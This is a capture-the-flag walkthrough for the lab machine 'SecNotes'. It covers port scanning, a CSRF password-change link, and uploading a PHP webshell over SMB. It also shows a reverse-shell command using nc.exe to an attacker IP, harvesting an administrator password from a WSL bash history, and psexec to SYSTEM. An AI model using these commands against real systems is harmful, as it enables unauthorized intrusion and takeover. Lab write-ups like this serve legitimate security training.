
### Initial access
Port scan
```
PORT     STATE SERVICE      REASON          VERSION
80/tcp   open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
445/tcp  open  microsoft-ds syn-ack ttl 127 Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: SECNOTES
|   NetBIOS computer name: SECNOTES\x00
|   Workgroup: HTB\x00
|_  System time: 2026-09-20T23:32:39-07:00
|_clock-skew: mean: 2h18m36s, deviation: 4h02m31s, median: -1m24s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40408/tcp): CLEAN (Timeout)
|   Check 2 (port 21419/tcp): CLEAN (Timeout)
|   Check 3 (port 59973/udp): CLEAN (Timeout)
|   Check 4 (port 4187/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-21T06:32:36
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


```
subdomain scan
dirscan
filescan

We can create user in login page , create one and continue  testing web app and see new user tyler we see the website dont have csrf so we use hidden link in html to change  tyler user pass

```html
http://10.129.42.249/change_pass.php?password=password&confirm_password=password&submit=submit
http://10.10.17.47/noexist
```

We have cred
```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```
cred `tyler:92g!mA8BGjOirkL%OG*&`
Smb recon
```
┌──(kali㉿kali)-[~/HTB/SecNotes]
└─$ impacket-smbclient 'tyler:92g!mA8BGjOirkL%OG*&'@10.129.42.249 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
new-site
# 
# put /home/kali/oscp/exploit-tool/webshell.php
# 
# ls
drw-rw-rw-          0  Mon Sep 21 03:01:01 2026 .
drw-rw-rw-          0  Mon Sep 21 03:01:01 2026 ..
-rw-rw-rw-        696  Thu Jun 21 16:15:36 2018 iisstart.htm
-rw-rw-rw-      98757  Thu Jun 21 16:15:38 2018 iisstart.png
-rw-rw-rw-        114  Mon Sep 21 03:01:02 2026 webshell.php
# 


```

We have write in that share
```
┌──(kali㉿kali)-[~/HTB/SecNotes]
└─$ curl http://10.129.42.249:8808/webshell.php?cmd=whoami
<pre>secnotes\tyler
</pre>     
```
Let get rev shell we use nc.exe
```┌──(kali㉿kali)-[~/HTB/SecNotes]
└─$ curl http://10.129.42.249:8808/webshell.php?cmd=nc.exe%2010.10.17.47%204444%20-e%20powershell

┌──(kali㉿kali)-[~/HTB/SecNotes]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.42.249] 51997
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\new-site> whoami
whoami
secnotes\tyler
PS C:\inetpub\new-site> 

```

### Priv escalation
Run winpeas
```
����������͹ Looking for Linux shells/distributions - wsl.exe, bash.exe (T1059.004)
    C:\Windows\System32\wsl.exe
    C:\Windows\System32\bash.exe

    Found installed WSL distribution(s) - listed below
    Run linpeas.sh in your WSL distribution(s) home folder(s).

    Distribution:      "Ubuntu-18.04"
    WSL user:          ""
    Root directory:    "C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs"
    Run command:       wsl.exe --distribution "Ubuntu-18.04"
   =================================================================================================

```

Read wsl history bash
```
cat C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root\.bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit

```

We have cred 
`administrator:u6!4ZwgwOM#^OBf#Nwnh`

```
┌──(kali㉿kali)-[~/HTB/SecNotes]
└─$ impacket-psexec 'administrator':'u6!4ZwgwOM#^OBf#Nwnh'@10.129.42.249 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.42.249.....
[*] Found writable share ADMIN$
[*] Uploading file NkfJrDQF.exe
[*] Opening SVCManager on 10.129.42.249.....
[*] Creating service bMoP on 10.129.42.249.....
[*] Starting service bMoP.....
[!] Press help for extra shell commands
 
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> 
C:\WINDOWS\system32> whoami
nt authority\system


```